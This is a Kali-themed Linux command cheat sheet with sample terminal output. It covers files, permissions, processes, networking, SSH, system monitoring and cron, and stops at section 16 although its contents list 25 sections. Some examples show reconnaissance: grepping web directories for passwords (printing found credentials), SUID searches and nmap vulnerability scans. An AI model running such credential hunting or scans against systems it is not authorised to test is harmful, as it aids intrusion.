# 🖥️ Linux Command Reference — Visual Terminal Guide

> **25 sections · 300+ commands · Real terminal output examples**
> Master the terminal. Master the system.

---

## 📋 Table of Contents

| # | Section | # | Section |
|---|---------|---|---------|
| 01 | [Navigation & File System](#01--navigation--file-system) | 14 | [SSH & Remote Access](#14--ssh--remote-access) |
| 02 | [File Operations](#02--file-operations) | 15 | [System Info & Monitoring](#15--system-info--monitoring) |
| 03 | [File Viewing & Editing](#03--file-viewing--editing) | 16 | [Cron Jobs & Scheduling](#16--cron-jobs--scheduling) |
| 04 | [Permissions & Ownership](#04--permissions--ownership) | 17 | [Bash Scripting](#17--bash-scripting) |
| 05 | [User & Group Management](#05--user--group-management) | 18 | [Kali Linux Hacking Tools](#18--kali-linux-hacking-tools) |
| 06 | [Process Management](#06--process-management) | 19 | [Netcat & Socat](#19--netcat--socat) |
| 07 | [Networking Commands](#07--networking-commands) | 20 | [Git Commands](#20--git-commands) |
| 08 | [Package Management](#08--package-management) | 21 | [Docker Commands](#21--docker-commands) |
| 09 | [Disk & Storage](#09--disk--storage) | 22 | [Tmux & Screen](#22--tmux--screen) |
| 10 | [Compression & Archives](#10--compression--archives) | 23 | [Firewall & iptables](#23--firewall--iptables) |
| 11 | [Searching & Filtering](#11--searching--filtering) | 24 | [Log Analysis](#24--log-analysis) |
| 12 | [Redirection & Pipes](#12--redirection--pipes) | 25 | [One-Liners & Power Tricks](#25--one-liners--power-tricks) |
| 13 | [Environment & Shell](#13--environment--shell) | | |

---

## 01 · Navigation & File System

```bash
┌──(ayush㉿kali)-[~]
└─$ pwd
/home/ayush

┌──(ayush㉿kali)-[~]
└─$ ls
Desktop  Documents  Downloads  Music  Pictures  projects  Videos

┌──(ayush㉿kali)-[~]
└─$ ls -la
total 96
drwxr-xr-x 15 ayush ayush 4096 May 17 09:22 .
drwxr-xr-x  3 root  root  4096 Jan 10 08:00 ..
-rw-------  1 ayush ayush 2847 May 17 09:21 .bash_history
-rw-r--r--  1 ayush ayush  220 Jan 10 08:00 .bash_logout
-rw-r--r--  1 ayush ayush 3526 Jan 10 08:00 .bashrc
drwxr-xr-x  8 ayush ayush 4096 May 17 08:45 projects
drwxr-xr-x  2 ayush ayush 4096 May 15 14:30 Documents

┌──(ayush㉿kali)-[~]
└─$ ls -lh
total 48K
drwxr-xr-x 2 ayush ayush 4.0K May 17 09:00 Desktop
drwxr-xr-x 3 ayush ayush 4.0K May 16 11:20 Documents
drwxr-xr-x 5 ayush ayush 4.0K May 17 08:45 projects

┌──(ayush㉿kali)-[~]
└─$ cd projects

┌──(ayush㉿kali)-[~/projects]
└─$ cd ..

┌──(ayush㉿kali)-[~]
└─$ cd -
/home/ayush/projects

┌──(ayush㉿kali)-[~/projects]
└─$ tree -L 2
.
├── ctf
│   ├── notes.md
│   └── tools
├── scripts
│   ├── enum.sh
│   └── recon.py
└── web
    ├── index.html
    └── app.js

6 directories, 5 files

┌──(ayush㉿kali)-[~]
└─$ du -sh *
4.0K    Desktop
12K     Documents
256K    projects
8.0K    Downloads

┌──(ayush㉿kali)-[~]
└─$ realpath notes.txt
/home/ayush/notes.txt
```

---

## 02 · File Operations

```bash
┌──(ayush㉿kali)-[~/projects]
└─$ touch exploit.py report.txt config.yml
# Creates three empty files

┌──(ayush㉿kali)-[~/projects]
└─$ mkdir -p ctf/challenges/web
# Creates nested directories in one shot

┌──(ayush㉿kali)-[~/projects]
└─$ cp report.txt report_backup.txt

┌──(ayush㉿kali)-[~/projects]
└─$ cp -r ctf/ ctf_backup/
# Recursively copies entire directory

┌──(ayush㉿kali)-[~/projects]
└─$ mv old_name.sh new_name.sh
# Rename a file

┌──(ayush㉿kali)-[~/projects]
└─$ mv config.yml /etc/myapp/
# Move file to another directory

┌──(ayush㉿kali)-[~/projects]
└─$ rm report.txt
┌──(ayush㉿kali)-[~/projects]
└─$ rm -rf ctf_backup/
# ⚠ WARNING: Irreversible — deletes everything recursively

┌──(ayush㉿kali)-[~/projects]
└─$ ln -s /home/ayush/projects/scripts /usr/local/bin/myscripts
# Creates symbolic link

┌──(ayush㉿kali)-[~/projects]
└─$ stat exploit.py
  File: exploit.py
  Size: 0           Blocks: 0          IO Block: 4096   regular empty file
Device: 8,1 Inode: 3407876    Links: 1
Access: (0644/-rw-r--r--)  Uid: ( 1000/   ayush)   Gid: ( 1000/   ayush)
Access: 2024-05-17 09:22:11
Modify: 2024-05-17 09:22:11
Change: 2024-05-17 09:22:11

┌──(ayush㉿kali)-[~/projects]
└─$ file mystery_binary
mystery_binary: ELF 64-bit LSB executable, x86-64, dynamically linked

┌──(ayush㉿kali)-[~/projects]
└─$ wc -l /etc/passwd
43 /etc/passwd

┌──(ayush㉿kali)-[~/projects]
└─$ diff file1.txt file2.txt
3c3
< old line content here
---
> new line content here

┌──(ayush㉿kali)-[~/projects]
└─$ rsync -av src/ dest/
sending incremental file list
./
index.html
style.css
app.js
sent 12,450 bytes  received 92 bytes  24,904 bytes/sec
total size is 12,231  speedup is 0.98
```

---

## 03 · File Viewing & Editing

```bash
┌──(ayush㉿kali)-[~]
└─$ cat /etc/os-release
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
ID=kali
VERSION="2024.1"
VERSION_ID="2024.1"
ID_LIKE=debian
HOME_URL="https://www.kali.org/"

┌──(ayush㉿kali)-[~]
└─$ cat -n /etc/hosts
     1  127.0.0.1    localhost
     2  127.0.1.1    kali
     3  ::1          localhost ip6-localhost ip6-loopback
     4  192.168.1.1  router.local

┌──(ayush㉿kali)-[~]
└─$ head -n 5 /var/log/syslog
May 17 09:00:01 kali CRON[1423]: (root) CMD (/usr/lib/accountsservice/...)
May 17 09:01:11 kali systemd[1]: Starting Cleanup of Temporary Directories...
May 17 09:01:11 kali systemd[1]: systemd-tmpfiles-clean.service: Succeeded.
May 17 09:05:01 kali CRON[1587]: (root) CMD (command -v debian-sa1 > /dev/null)
May 17 09:10:01 kali CRON[1653]: (root) CMD (test -x /usr/sbin/anacron || ...)

┌──(ayush㉿kali)-[~]
└─$ tail -n 5 /var/log/auth.log
May 17 09:20:31 kali sshd[2341]: Accepted publickey for ayush from 192.168.1.10
May 17 09:20:31 kali sshd[2341]: pam_unix(sshd:session): session opened for user ayush
May 17 09:21:00 kali sudo[2389]: ayush : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
May 17 09:21:05 kali sudo[2389]: pam_unix(sudo:session): session opened for root
May 17 09:22:14 kali sudo[2401]: pam_unix(sudo:session): session closed for root

┌──(ayush㉿kali)-[~]
└─$ tail -f /var/log/syslog
# Live follows log output — press Ctrl+C to stop
May 17 09:25:01 kali CRON[1823]: (root) CMD (...)
May 17 09:25:14 kali kernel: [12345.678901] eth0: renamed from veth...
^C
```

```
# ── VIM QUICK REFERENCE ─────────────────────────────────────────
#
#   $ vim notes.txt          ← open file
#
#   NORMAL MODE (default)    INSERT MODE (press i)
#   ──────────────────────   ───────────────────────
#   dd     delete line       Type freely to edit
#   yy     copy line         ESC to return to Normal
#   p      paste
#   /word  search            COMMAND MODE (press :)
#   u      undo              ───────────────────────
#   gg     go to top         :w      save
#   G      go to bottom      :q      quit
#   :%s/old/new/g  replace   :wq     save & quit
#                            :q!     force quit
```

---

## 04 · Permissions & Ownership

```bash
┌──(ayush㉿kali)-[~/projects]
└─$ ls -l
total 24
-rw-r--r-- 1 ayush ayush  512 May 17 09:00 config.yml
-rwxr-xr-x 1 ayush ayush 1024 May 16 14:22 enum.sh
-rw------- 1 ayush ayush 2048 May 15 10:00 secret.key
drwxr-xr-x 2 ayush ayush 4096 May 17 08:45 web/

# Permission breakdown:  rwxr-xr-x
#   Owner:  rwx (7) → read + write + execute
#   Group:  r-x (5) → read + execute
#   Others: r-x (5) → read + execute

┌──(ayush㉿kali)-[~/projects]
└─$ chmod 755 enum.sh
# rwxr-xr-x  — standard script permissions

┌──(ayush㉿kali)-[~/projects]
└─$ chmod 600 secret.key
# rw-------  — only owner can read/write

┌──(ayush㉿kali)-[~/projects]
└─$ chmod +x deploy.sh
┌──(ayush㉿kali)-[~/projects]
└─$ chmod u+rw,g-w,o-r config.yml
# Granular: user +rw, group -write, others -read

┌──(ayush㉿kali)-[~/projects]
└─$ chown ayush:www-data web/
┌──(ayush㉿kali)-[~/projects]
└─$ chown -R ayush:ayush /home/ayush/projects/

┌──(ayush㉿kali)-[~]
└─$ sudo -i
[sudo] password for ayush: ••••••••

┌──(root㉿kali)-[/root]
└─# visudo
# Opens sudoers safely in editor — never edit /etc/sudoers directly

# ── Permission Number Reference ──────────────────────────────
# 4 = read (r)   2 = write (w)   1 = execute (x)
# ───────────────────────────────────────────────
# 7 = rwx   6 = rw-   5 = r-x   4 = r--   0 = ---
# ───────────────────────────────────────────────
# 755 → owner: rwx  group: r-x  others: r-x  (scripts/dirs)
# 644 → owner: rw-  group: r--  others: r--  (regular files)
# 600 → owner: rw-  group: ---  others: ---  (private keys)
# 777 → all:   rwx  ⚠ avoid in production
```

---

## 05 · User & Group Management

```bash
┌──(root㉿kali)-[~]
└─# whoami
root

┌──(ayush㉿kali)-[~]
└─$ id
uid=1000(ayush) gid=1000(ayush) groups=1000(ayush),27(sudo),1001(docker)

┌──(ayush㉿kali)-[~]
└─$ who
ayush    pts/0        2024-05-17 09:20 (192.168.1.10)
root     tty1         2024-05-17 08:00

┌──(root㉿kali)-[~]
└─# useradd -m -s /bin/bash newuser
└─# passwd newuser
New password: ••••••••
Retype new password: ••••••••
passwd: password updated successfully

┌──(root㉿kali)-[~]
└─# usermod -aG sudo,docker newuser
# Add user to multiple groups

┌──(root㉿kali)-[~]
└─# groups newuser
newuser : newuser sudo docker

┌──(root㉿kali)-[~]
└─# cat /etc/passwd | head -5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
ayush:x:1000:1000:Ayush,,,:/home/ayush:/bin/bash
newuser:x:1001:1001:,,,:/home/newuser:/bin/bash

┌──(root㉿kali)-[~]
└─# last
ayush    pts/0        192.168.1.10     Fri May 17 09:20   still logged in
root     tty1                          Fri May 17 08:00   still logged in
ayush    pts/0        192.168.1.10     Thu May 16 22:14 - 23:45  (01:31)

┌──(root㉿kali)-[~]
└─# userdel -r olduser
# Deletes user AND home directory
```

---

## 06 · Process Management

```bash
┌──(ayush㉿kali)-[~]
└─$ ps aux | head -8
USER       PID  %CPU %MEM    VSZ   RSS TTY      STAT  COMMAND
root         1   0.0  0.1 168144 11200 ?        Ss    /sbin/init
root       412   0.0  0.2 245828 18432 ?        Ss    /lib/systemd/systemd-journald
root       445   0.0  0.1  21800  8192 ?        Ss    /lib/systemd/systemd-udevd
root       800   0.0  0.3 281064 25600 ?        Ss    /usr/sbin/sshd -D
ayush     1823   0.0  0.1  22688  9472 pts/0    Ss    bash
ayush     2100   0.2  0.5 812032 43520 pts/0    Sl    python3 scan.py
ayush     2340   0.0  0.0  13312  3584 pts/0    R+    ps aux

┌──(ayush㉿kali)-[~]
└─$ ps aux | grep nginx
www-data  1423  0.0  0.1  55676  6144 ?        S    09:00  nginx: worker process
www-data  1424  0.0  0.1  55676  5888 ?        S    09:00  nginx: worker process
root      1420  0.0  0.1  55400  5632 ?        Ss   09:00  nginx: master process

┌──(ayush㉿kali)-[~]
└─$ kill -9 2100
# Force kills process with PID 2100

┌──(ayush㉿kali)-[~]
└─$ killall python3
# Kills all python3 processes

┌──(ayush㉿kali)-[~]
└─$ lsof -i :80
COMMAND  PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
nginx   1420     root   6u  IPv4  12345      0t0  TCP *:http (LISTEN)
nginx   1423 www-data   6u  IPv4  12345      0t0  TCP *:http (LISTEN)

┌──(ayush㉿kali)-[~]
└─$ python3 heavy_scan.py &
[1] 2500
# Runs in background — PID shown in brackets

┌──(ayush㉿kali)-[~]
└─$ jobs
[1]+  Running    python3 heavy_scan.py &

┌──(ayush㉿kali)-[~]
└─$ nohup python3 long_task.py &
nohup: ignoring input and appending output to 'nohup.out'
[1] 2601
# Keeps running even after terminal closes

┌──(ayush㉿kali)-[~]
└─$ watch -n 2 'ps aux | grep python3'
# Refreshes every 2 seconds — Ctrl+C to stop
```

---

## 07 · Networking Commands

```bash
┌──(ayush㉿kali)-[~]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.100/24 brd 192.168.1.255 scope global dynamic eth0
3: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN
    link/ether 00:11:22:33:44:55 brd ff:ff:ff:ff:ff:ff

┌──(ayush㉿kali)-[~]
└─$ ping -c 4 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=12.3 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=11.8 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=115 time=12.1 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=115 time=11.9 ms
--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 11.8/12.0/12.3/0.2 ms

┌──(ayush㉿kali)-[~]
└─$ dig google.com
;; ANSWER SECTION:
google.com.     299   IN   A   142.250.190.78

;; Query time: 12 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)

┌──(ayush㉿kali)-[~]
└─$ dig +short google.com
142.250.190.78

┌──(ayush㉿kali)-[~]
└─$ curl -I https://example.com
HTTP/2 200
content-type: text/html; charset=UTF-8
server: ECS (nyb/1D18)
x-cache: HIT
content-length: 1256
date: Fri, 17 May 2024 09:25:00 GMT

┌──(ayush㉿kali)-[~]
└─$ ss -tulnp
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port
tcp    LISTEN  0       128            0.0.0.0:22            0.0.0.0:*    users:(("sshd",pid=800))
tcp    LISTEN  0       511            0.0.0.0:80            0.0.0.0:*    users:(("nginx",pid=1420))
tcp    LISTEN  0       128            0.0.0.0:443           0.0.0.0:*    users:(("nginx",pid=1420))

┌──(ayush㉿kali)-[~]
└─$ curl ifconfig.me
203.45.67.89
```

---

## 08 · Package Management

```bash
# ── APT (Debian · Ubuntu · Kali) ────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ sudo apt update
Get:1 http://kali.download/kali kali-rolling InRelease [41.5 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [19.8 MB]
Fetched 19.8 MB in 8s (2,475 kB/s)
Reading package lists... Done
Building dependency tree... Done
All packages are up to date.

┌──(ayush㉿kali)-[~]
└─$ sudo apt install nmap -y
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed: nmap
0 upgraded, 1 newly installed, 0 to remove.
Need to get 5,726 kB of archives.
Setting up nmap (7.94+git20230807) ...

┌──(ayush㉿kali)-[~]
└─$ apt list --installed 2>/dev/null | grep nmap
nmap/kali-rolling,now 7.94+git20230807 amd64 [installed]

┌──(ayush㉿kali)-[~]
└─$ sudo apt remove nmap
Removing nmap (7.94+git20230807) ...

┌──(ayush㉿kali)-[~]
└─$ sudo apt autoremove
Reading package lists... Done
0 upgraded, 0 newly installed, 3 to remove.
Removing unused packages: liblinear4 lua5.4 libpcap0.8

# ── DPKG ────────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ dpkg -i burpsuite.deb
Selecting previously unselected package burpsuite.
Setting up burpsuite (2024.3.1) ...

┌──(ayush㉿kali)-[~]
└─$ dpkg -l | grep python3
ii  python3           3.11.2-1   amd64   interactive high-level OO python3
ii  python3-pip       23.0.1     all     Python package installer

# ── PIP ─────────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ pip3 install requests scapy
Collecting requests
  Downloading requests-2.31.0-py3-none-any.whl (62 kB)
Collecting scapy
  Downloading scapy-2.5.0.tar.gz (1.3 MB)
Successfully installed requests-2.31.0 scapy-2.5.0
```

---

## 09 · Disk & Storage

```bash
┌──(ayush㉿kali)-[~]
└─$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   18G   30G  38% /
tmpfs           2.0G     0  2.0G   0% /dev/shm
/dev/sdb1       500G  120G  356G  26% /data

┌──(ayush㉿kali)-[~]
└─$ lsblk
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
sda      8:0    0    50G  0 disk
├─sda1   8:1    0    49G  0 part /
└─sda2   8:2    0     1G  0 part [SWAP]
sdb      8:16   0   500G  0 disk
└─sdb1   8:17   0   500G  0 part /data

┌──(ayush㉿kali)-[~]
└─$ du -ah --max-depth=1 /home/ayush/
4.0K    /home/ayush/.bashrc
4.0K    /home/ayush/.profile
256K    /home/ayush/projects
48K     /home/ayush/Documents
316K    /home/ayush/

┌──(root㉿kali)-[~]
└─# fdisk -l /dev/sdb
Disk /dev/sdb: 500 GiB, 536870912000 bytes, 1048576000 sectors
Device     Boot   Start        End    Sectors   Size Id Type
/dev/sdb1          2048 1048575999 1048573952   500G 83 Linux

┌──(root㉿kali)-[~]
└─# blkid
/dev/sda1: UUID="a1b2c3d4-e5f6-7890-abcd-ef1234567890" TYPE="ext4"
/dev/sdb1: UUID="12345678-abcd-ef01-2345-67890abcdef0" TYPE="ext4"

┌──(root㉿kali)-[~]
└─# dd if=/dev/sda of=/data/system_backup.img bs=4M status=progress
5000+0 records in
5000+0 records out
20971520000 bytes (21 GB, 20 GiB) copied, 85.3 s, 246 MB/s
# ⚠ Clones entire drive — ensure correct if= and of=
```

---

## 10 · Compression & Archives

```bash
# ── TAR ─────────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~/projects]
└─$ tar -czvf backup_2024.tar.gz web/
web/
web/index.html
web/style.css
web/app.js
# c=create  z=gzip  v=verbose  f=filename

┌──(ayush㉿kali)-[~/projects]
└─$ tar -xzvf backup_2024.tar.gz
web/
web/index.html
web/style.css
web/app.js

┌──(ayush㉿kali)-[~/projects]
└─$ tar -tf backup_2024.tar.gz
web/
web/index.html
web/style.css
web/app.js
# List contents WITHOUT extracting

# ── ZIP ──────────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~/projects]
└─$ zip -r project.zip web/ scripts/
  adding: web/ (stored 0%)
  adding: web/index.html (deflated 54%)
  adding: web/style.css (deflated 72%)
  adding: scripts/enum.sh (deflated 41%)

┌──(ayush㉿kali)-[~/projects]
└─$ unzip -l project.zip
Archive:  project.zip
  Length     Date    Time    Name
  --------  ------  -----   ----
      1024  05-17-2024  09:00  web/index.html
       512  05-16-2024  14:00  web/style.css
      2048  05-15-2024  10:00  scripts/enum.sh

┌──(ayush㉿kali)-[~/projects]
└─$ unzip project.zip -d /tmp/extracted/
# Extracts to specific directory
```

---

## 11 · Searching & Filtering

```bash
# ── GREP ────────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ grep -r "password" /var/www/ 2>/dev/null
/var/www/html/config.php:$db_pass = "supersecret123";
/var/www/html/backup.sql:-- Password: admin123

┌──(ayush㉿kali)-[~]
└─$ grep -n "Failed password" /var/log/auth.log
42: May 17 09:10:15 kali sshd[1234]: Failed password for root from 10.0.0.5
87: May 17 09:11:02 kali sshd[1235]: Failed password for admin from 10.0.0.5

┌──(ayush㉿kali)-[~]
└─$ grep -c "Failed" /var/log/auth.log
347
# 347 failed login attempts found

┌──(ayush㉿kali)-[~]
└─$ grep -v "^#" /etc/ssh/sshd_config | grep -v "^$"
# Shows only active config lines (no comments, no blanks)
Port 22
AddressFamily any
PermitRootLogin no
PasswordAuthentication yes

# ── FIND ────────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ find / -name "*.conf" -type f 2>/dev/null | head -5
/etc/ssh/sshd_config
/etc/nginx/nginx.conf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/apt/apt.conf.d/01autoremove
/etc/ca-certificates.conf

┌──(ayush㉿kali)-[~]
└─$ find / -type f -size +100M 2>/dev/null
/home/ayush/Downloads/kali-linux-2024.iso
/data/backup/system_backup.img

┌──(ayush㉿kali)-[~]
└─$ find / -perm 777 2>/dev/null
/tmp/suspicious_script.sh
/var/tmp/writable_dir

┌──(ayush㉿kali)-[~]
└─$ find . -name "*.py" -exec grep -l "import socket" {} \;
./scripts/reverse_shell.py
./ctf/challenges/web/exploit.py

# ── AWK & SED ────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ awk -F: '{print $1}' /etc/passwd | head -8
root
daemon
bin
sys
sync
games
man
ayush

┌──(ayush㉿kali)-[~]
└─$ sed 's/password/[REDACTED]/g' config.txt
db_user = admin
db_pass = [REDACTED]
api_key = [REDACTED]

┌──(ayush㉿kali)-[~]
└─$ cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -rn | head -5
    523 192.168.1.105
    341 10.0.0.2
    210 192.168.1.100
     87 172.16.0.5
     12 203.45.67.89
```

---

## 12 · Redirection & Pipes

```bash
┌──(ayush㉿kali)-[~]
└─$ ls -la > filelist.txt
# Saves output to file (overwrites)

┌──(ayush㉿kali)-[~]
└─$ echo "New entry" >> log.txt
# Appends to file

┌──(ayush㉿kali)-[~]
└─$ nmap 192.168.1.0/24 2> errors.txt
# Redirects error messages to file

┌──(ayush㉿kali)-[~]
└─$ nmap -v 192.168.1.1 > full_output.txt 2>&1
# Redirects BOTH stdout and stderr to same file

┌──(ayush㉿kali)-[~]
└─$ nmap -sn 192.168.1.0/24 > /dev/null 2>&1
# Completely suppresses all output

# ── PRACTICAL PIPE CHAINS ────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ ps aux | grep python3 | awk '{print $2}'
2100
2234
# Gets PIDs of all python3 processes

┌──(ayush㉿kali)-[~]
└─$ cat /var/log/auth.log | grep "Failed" | awk '{print $11}' | sort | uniq -c | sort -rn
    523 192.168.1.105
    341 10.0.0.2
    210 203.45.67.89
# Most active attackers by IP

┌──(ayush㉿kali)-[~]
└─$ ls -la | grep "^-" | wc -l
14
# Count only regular files (not directories)

┌──(ayush㉿kali)-[~]
└─$ nmap -sV 192.168.1.1 | tee scan_results.txt
Starting Nmap 7.94 ( https://nmap.org )
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0 (protocol 2.0)
80/tcp   open  http     nginx 1.24.0
443/tcp  open  ssl/http nginx 1.24.0
# Output goes to screen AND saved to file simultaneously
```

---

## 13 · Environment & Shell

```bash
┌──(ayush㉿kali)-[~]
└─$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games

┌──(ayush㉿kali)-[~]
└─$ echo $HOME $USER $SHELL
/home/ayush ayush /bin/bash

┌──(ayush㉿kali)-[~]
└─$ export GOPATH=/home/ayush/go
┌──(ayush㉿kali)-[~]
└─$ export PATH=$PATH:/home/ayush/go/bin
# Add Go binaries to PATH

┌──(ayush㉿kali)-[~]
└─$ alias ll='ls -la --color=auto'
┌──(ayush㉿kali)-[~]
└─$ alias gs='git status'
┌──(ayush㉿kali)-[~]
└─$ alias

alias gs='git status'
alias ll='ls -la --color=auto'
alias ls='ls --color=auto'

┌──(ayush㉿kali)-[~]
└─$ history | tail -10
  491  nmap -sV 192.168.1.1
  492  ssh ayush@10.0.0.5
  493  cat /etc/passwd
  494  find / -perm -4000 2>/dev/null
  495  grep -r "password" /var/www/
  496  ls -la
  497  cd projects/
  498  python3 exploit.py
  499  history | tail -10

┌──(ayush㉿kali)-[~]
└─$ history | grep nmap
  491  nmap -sV 192.168.1.1
  488  nmap -p- 192.168.1.0/24
  477  nmap --script vuln 10.0.0.5

┌──(ayush㉿kali)-[~]
└─$ source ~/.bashrc
# Reloads shell config (aliases, exports, functions)

# ── Shell Shortcuts ────────────────────────────────────────────
# Ctrl+r   → reverse search through history
# Ctrl+c   → kill current command
# Ctrl+z   → suspend to background (fg to resume)
# Ctrl+d   → logout / send EOF
# Ctrl+l   → clear terminal
# Ctrl+a   → jump to beginning of line
# Ctrl+e   → jump to end of line
# !!       → repeat last command
# sudo !!  → repeat last command as root
```

---

## 14 · SSH & Remote Access

```bash
# ── Key Generation ──────────────────────────────────────────────

┌──(ayush㉿kali)-[~/.ssh]
└─$ ssh-keygen -t ed25519 -C "ayush@kali"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/ayush/.ssh/id_ed25519):
Enter passphrase (empty for no passphrase): ••••••••
Your identification has been saved in /home/ayush/.ssh/id_ed25519
Your public key has been saved in /home/ayush/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:xKjN4m8PqR2vY7wZ3tL1oB5cD9eF0gH6iJ2kL8mN0pQ ayush@kali

┌──(ayush㉿kali)-[~/.ssh]
└─$ chmod 600 id_ed25519
└─$ chmod 644 id_ed25519.pub

# ── Connecting ──────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ ssh ayush@192.168.1.50
The authenticity of host '192.168.1.50' can't be established.
ED25519 key fingerprint is SHA256:abc123...
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.50' to the list of known hosts.
ayush@192.168.1.50's password: ••••••••
Linux server01 6.1.0-kali9-amd64 #1 SMP PREEMPT_DYNAMIC Kali
Last login: Thu May 16 22:14:32 2024 from 192.168.1.100

┌──(ayush㉿server01)-[~]
└─$ exit
logout
Connection to 192.168.1.50 closed.

┌──(ayush㉿kali)-[~]
└─$ ssh-copy-id ayush@192.168.1.50
# Copies public key → passwordless login enabled

# ── SSH Tunneling ───────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ ssh -L 8080:localhost:80 ayush@192.168.1.50
# Browse localhost:8080 → accesses port 80 on remote server

┌──(ayush㉿kali)-[~]
└─$ ssh -D 1080 ayush@192.168.1.50
# Creates SOCKS5 proxy on port 1080 → route traffic through remote

# ── SCP File Transfer ───────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ scp exploit.py ayush@192.168.1.50:/tmp/
exploit.py                          100% 2048     1.2MB/s   00:00

┌──(ayush㉿kali)-[~]
└─$ scp -r ayush@192.168.1.50:/var/log/ ./captured_logs/
auth.log                            100%  45KB   8.2MB/s   00:00
syslog                              100% 120KB   9.1MB/s   00:00

# ── ~/.ssh/config ────────────────────────────────────────────────
# nano ~/.ssh/config
# ──────────────────────────────────────
# Host server01
#     HostName 192.168.1.50
#     User ayush
#     Port 22
#     IdentityFile ~/.ssh/id_ed25519
# ──────────────────────────────────────
# Now just: ssh server01
```

---

## 15 · System Info & Monitoring

```bash
┌──(ayush㉿kali)-[~]
└─$ uname -a
Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 x86_64 GNU/Linux

┌──(ayush㉿kali)-[~]
└─$ uptime
 09:25:14 up 2 days,  1:23,  2 users,  load average: 0.52, 0.41, 0.38

┌──(ayush㉿kali)-[~]
└─$ free -h
               total        used        free      shared  buff/cache   available
Mem:           7.7Gi       2.1Gi       3.8Gi       312Mi       1.8Gi       5.0Gi
Swap:          2.0Gi          0B       2.0Gi

┌──(ayush㉿kali)-[~]
└─$ lscpu
Architecture:            x86_64
  CPU op-mode(s):        32-bit, 64-bit
  CPU(s):                8
  Thread(s) per core:    2
  Core(s) per socket:    4
  Model name:            Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz
  CPU MHz:               2200.000
  L2 cache:              1024 KiB
  L3 cache:              9216 KiB

# ── Services ────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled)
     Active: active (running) since Fri 2024-05-17 08:00:01 IST; 1h 25min ago
   Main PID: 800 (sshd)
      Tasks: 1 (limit: 9372)
     Memory: 5.4M

┌──(root㉿kali)-[~]
└─# systemctl enable nginx
Created symlink /etc/systemd/system/multi-user.target.wants/nginx.service
→ /lib/systemd/system/nginx.service.

┌──(ayush㉿kali)-[~]
└─$ journalctl -u nginx --since "10 minutes ago"
May 17 09:20:01 kali nginx[1420]: 2024/05/17 09:20:01 [notice] signal process started
May 17 09:21:15 kali nginx[1420]: 192.168.1.10 - - [17/May/2024:09:21:15] "GET / HTTP/1.1" 200 612

┌──(ayush㉿kali)-[~]
└─$ journalctl -f
# Live stream of all system logs — Ctrl+C to stop
```

---

## 16 · Cron Jobs & Scheduling

```bash
┌──(ayush㉿kali)-[~]
└─$ crontab -l
# Current user cron jobs:
# m h  dom mon dow   command
0 */6 * * * /home/ayush/scripts/backup.sh >> /var/log/backup.log 2>&1
*/30 * * * * /home/ayush/scripts/check_targets.py
0 9 * * 1 /home/ayush/scripts/weekly_report.sh

┌──(ayush㉿kali)-[~]
└─$ crontab -e
# Opens your crontab in editor

┌──(root㉿kali)-[~]
└─# cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m   h  dom  mon  dow  user     command
17  *   *   *   *   root    cd / && run-parts --report /etc/cron.hourly
25  6   *   *   *   root    test -x /usr/sbin/anacron || ( cd / && run-parts /etc/cron.daily )
47  6   *   *   7   root    test -x /usr/sbin/anacron || ( cd / && run-parts /etc/cron.weekly )
52  6   1   *   *   root    test -x /usr/sbin/anacron || ( cd / && run-parts /etc/cron.monthly )

